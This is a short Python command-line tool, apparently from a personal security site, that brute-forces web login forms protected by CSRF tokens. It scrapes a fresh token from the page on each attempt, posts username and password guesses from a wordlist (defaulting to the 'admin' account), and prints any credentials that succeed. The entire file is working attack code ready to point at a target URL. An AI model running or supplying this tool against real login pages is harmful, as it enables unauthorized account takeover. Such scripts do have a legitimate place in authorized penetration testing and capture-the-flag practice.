#!/usr/bin/python3
import sys
import signal
import requests
import argparse
import textwrap
import threading
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(
    prog='csrfb33f.py',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description=textwrap.dedent('''\
-------------------------------------------------------------
------------ | Brute-force CSRF |----------------------------
-------------------------------------------------------------
                __ _      _____  _____  __ 
               / _| |    |____ ||____ |/ _|
  ___ ___ _ __| |_| |__      / /    / / |_ 
 / __/ __| '__|  _| '_ \     \ \    \ \  _|
| (__\__ \ |  | | | |_) |.___/ /.___/ / |  
 \___|___/_|  |_| |_.__/ \____/ \____/|_|  
                                      V 0.1
by h4rith.com
-------------------------------------------------------------'''),
    usage='python3 %(prog)s -u [url] -w [wordlist] -c [token-name]',
    epilog='---------------- Script from h4rithd.com ----------------')

parser._action_groups.pop()
required = parser.add_argument_group('[!] Required arguments')
optional = parser.add_argument_group('[!] Optional arguments')

required.add_argument('-u','--url', metavar='', required=True, help='Target URL') 
required.add_argument('-w','--wordlist', metavar='', required=True, help='Wordlist path') 
required.add_argument('-c','--token', metavar='', required=True, help='CSRF token name')

optional.add_argument('-user','--username', metavar='',help='Username')

args = parser.parse_args()

if args.username is not None:
   user = args.username
else:
   user = 'admin'

s = requests.session()

def sendRequests(username, password):
   page = s.get(args.url)
   soup = BeautifulSoup(page.content, 'html.parser')
   token = soup.find('input', attrs = { 'name' : args.token })['value']
   data = { 'username' : username,  # Change this
            'password' : password,  # Change this
            'submit' : 'submit',  # Change this
             args.token : token }
   response = s.post(args.url, data = data)
   if 'incorrect' not in response.text:
      print("\n"+"-"*75+"\n\t\t[+] Credentials found !! {}:{}".format(username, password)+"\n"+"-"*75)
      sys.exit()

def run():
   with open(args.wordlist) as wordlist:
      for word in wordlist:
         password = word.rstrip()
         print("[*] Trying {}:{}".format(user,password), flush=True)
         sys.stdout.flush()
         sendRequests(user,password)


if __name__ == '__main__':
   signal.signal(signal.SIGINT, quit)
   run_thread = threading.Thread(target=run)
   run_thread.start()
